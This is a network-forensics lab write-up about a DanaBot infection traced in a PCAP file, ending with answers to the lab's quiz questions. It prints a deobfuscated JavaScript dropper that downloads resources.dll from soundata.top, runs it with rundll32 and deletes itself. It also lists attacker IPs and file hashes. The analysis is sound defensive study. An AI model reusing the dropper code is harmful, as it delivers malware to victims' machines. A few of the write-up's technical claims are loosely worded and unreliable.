# Scenario & Objective

The SOC team has detected suspicious activity in the network traffic, revealing that a machine has been compromised. Sensitive company information has been stolen. 

My task is to use PCAP file called `205-DanaBot.pcap` and Threat Intelligence to investigate the incident and determine how the breach occurred. 

SHA256 value (205-DanaBot.pcap): d7624c8b2c987abb196ee8eddc8da93b19bbc51abbf0aaa002d56e088915b512

- **Category**: Network Forensics
- **Tools**: Wireshark, VirusTotal, ANY.RUN, Network Miner
# Overview

On **February 14, 2024**, at **23:25**, a host on the local network (**10.2.14.1**) was compromised after a user made a mistyped DNS query. The host connected to a malicious server at **62.173.142.148** and downloaded a JavaScript file named **allegato_708.js**.

This malicious script was executed using **Wscript.Shell.exe**, which then contacted the external domain `soundata.top` to download a second-stage payload, **resources.dll**. The execution of this DLL allowed the attacker to gather system information, steal sensitive credentials, and compromise the network.
# Analysis

This PCAP file records network traffic from `23:25:53` to `23:50:17` on `2024-02-14`, contain `13 900` packets with `39` different IP addresses. The main type of network traffic is `TLS` with `6.8%` of all packets.
<p align="center">
  <img src="./Assets/Image 1 - All IP addresses.webp" alt="All IP addresses" /> <br />
  <em>Image 1: All IP addresses</em>
</p>

<p align="center">
  <img src="./Assets/Image 2 - Protocols hierachy.webp" alt="Protocols hierachy" /> <br />
  <em>Image 2: Protocols hierachy</em>
</p>

When openning the pcap file, I can see at `23:25` the host `10.2.14.1` sent DNS request of a `portfolio.serveirc.com`. However the mistyped domain name, host still received an IP `62.173.142.148` as its domain.<p align="center">
  <img src="./Assets/Image 3 - Connect to fake domain because of mistyped query.webp" alt="Connect to fake domain because of mistyped query" /> <br />
  <em>Image 3: Connect to fake domain because of mistyped query</em>
</p>

At `23:25:54` host connected to that fake domain through `/login.php`, so maybe attacker can get all his credentials. After that, the host got a file called `allegato_708.js`. Then, I filter with this suspicious IP `ip.addr == 62.173.142.148`, but I do not find other suspicious activities of this IP address to the host. 

Then, I want to know more about this file, so I go to `File > Export Obejects > HTTP` to download file `login.php`. Here is hash value of this malware: 

SHA256: `847b4ad90b1daba2d9117a8e05776f3f902dda593fb1252289538acf476c4268`.
MD5: 5daf53bf848bb4cda008a655bdecf425

Then, I check this hash value in Virustotal and it is absolutely a malware.
<p align="center">
  <img src="./Assets/Image 4 - Check file in Virustotal.webp" alt="Check file in Virustotal" /> <br />
  <em>Image 4: Check file in Virustotal</em>
</p>

Basically, this malware called `login.php` or `allegato_708.js` can connect to C2 server  `104.21.33.40` or `74.125.69.94`. It also can connect to domain `soundata.top` and download file `resources.dll`.
<p align="center">
  <img src="./Assets/Image 5.1 - Name of malware.webp" alt="Name of malware" /> <br />
  <img src="./Assets/Image 5.2 - Malware's behavior.webp" alt="Malware's behavior" /> <br />
  <em>Image 5: Malware's information and behavior</em>
</p>

Moreoever, this file was obfuscatored, so I need to deobfuscatore and I have this
```login.php
function _0x414360(_0x5c5160) {
  var _0x119065 = '';
  var _0x5a393f = "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".length;
  for (var _0x3d45b7 = 0x0; _0x3d45b7 < _0x5c5160; _0x3d45b7++) {
    _0x119065 += "ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz".charAt(Math.floor(Math.random() * _0x5a393f));
  }
  return _0x119065 + ".dll";
}
var _0x48a85a = _0x414360(0xa);
var _0x44bdd9 = new ActiveXObject("Scripting.FileSystemObject").GetSpecialFolder(0x2) + "\\" + _0x48a85a;
var _0x5da57f = WScript.CreateObject("MSXML2.XMLHTTP");
_0x5da57f.Open("GET", "http://soundata.top/resources.dll", false);
_0x5da57f.Send();
if (_0x5da57f.Status == 0xc8) {
  var _0x3c8952 = WScript.CreateObject("ADODB.Stream");
  _0x3c8952.Open();
  _0x3c8952.Type = 0x1;
  _0x3c8952.Write(_0x5da57f.ResponseBody);
  _0x3c8952.Position = 0x0;
  _0x3c8952.SaveToFile(_0x44bdd9, 0x2);
  _0x3c8952.Close();
  var _0x1e16b0 = WScript.CreateObject("Wscript.Shell");
  _0x1e16b0.Run("rundll32.exe /B " + _0x44bdd9 + ",start", 0x0, true);
}
new ActiveXObject("Scripting.FileSystemObject").DeleteFile(WScript.ScriptFullName);
```
From the code above, I can see `var _0x1e16b0 = WScript.CreateObject("Wscript.Shell")` line, I know that `rundll32.exe` will be executed when `WScript` create an object.

Then, as I said above about behavior of malware. At `23:26:58`, the host `188.114.97.3` request to url `http://soundata.top/resources.dll`.
<p align="center">
  <img src="./Assets/Image 6 - Malware download dll file.webp" alt="Malware download dll file" /> <br />
  <em>Image 6: Malware download dll file</em>
</p>

Then like above, I go to `File > Export Obejects > HTTP` to download file `resources.dll` flie. And here is the hash value of the file.

SHA256: 2597322a49a6252445ca4c8d713320b238113b3b8fd8a2d6fc1088a5934cee0e
MD5: e758e07113016aca55d9eda2b0ffeebe

This malware can gather credential and environment information, copy, create or delete file, terminate process or create thread.
# Answer the Questions

**Q1: Which IP address was used by the attacker during the initial access?**

It is `62.173.142.148`.

**Q2: What is the name of the malicious file used for initial access?**

It is `allegato_708.js`.

**Q3: What is the SHA-256 hash of the malicious file used for initial access?**

It is `847b4ad90b1daba2d9117a8e05776f3f902dda593fb1252289538acf476c4268`.

**Q4: Which process was used to execute the malicious file?**

It is `Wscript.Shell.exe`.

**Q5: What is the file extension of the second malicious file utilized by the attacker?**

It is `.dll`.

**Q6: What is the MD5 hash of the second malicious file?**

MD5 hash value of malware is `e758e07113016aca55d9eda2b0ffeebe`.
